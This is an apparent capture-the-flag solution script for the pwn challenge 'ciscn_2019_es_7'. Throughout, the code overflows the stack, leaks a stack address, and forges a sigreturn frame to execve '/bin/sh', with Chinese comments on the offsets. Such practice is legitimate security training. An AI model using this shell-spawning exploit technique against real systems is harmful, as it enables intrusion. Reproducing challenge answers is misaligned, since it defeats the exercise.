import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./ciscn_2019_es_7',
    remote='node4.buuoj.cn:29202',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

syscall_ret = elf.rop['syscall']
sigreturn_addr = 0x4004da  # mov rax,0x0f
# system_addr = 0x4004E2  # mov rax,0x3b


def exp():
    r = [b'/bin/sh\x00', b'a' * 8]  # 此题没有leave，所以只需要覆盖到s的位置即可
    ret_addr = elf.search_string(b'\xc3')  # sometime maybe wrong
    r += [ret_addr]  # 栈平衡
    return r


# 0x4004f1 # 此处注意不要切出当前函数，否则会导致抬栈从而覆盖之前写入的binsh
read_addr = elf.symbols['vuln']
payload = [exp(), read_addr]  # 返回到读取的地方
pause()
se(payload)

rc(32)  # 定位到系统地址位置
stack_addr = u00(rc(8))
binsh_addr = stack_addr - 0x128  # 注意，本地经常性比远程会多-0x10
log.success(f'stack:{hex(stack_addr)}')  # 泄露当前栈地址
log.success(f'stack:{hex(binsh_addr)}')

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh_addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

payload = exp()
payload += [sigreturn_addr, syscall_ret, bytes(sigframe)]
se(payload)

interactive()
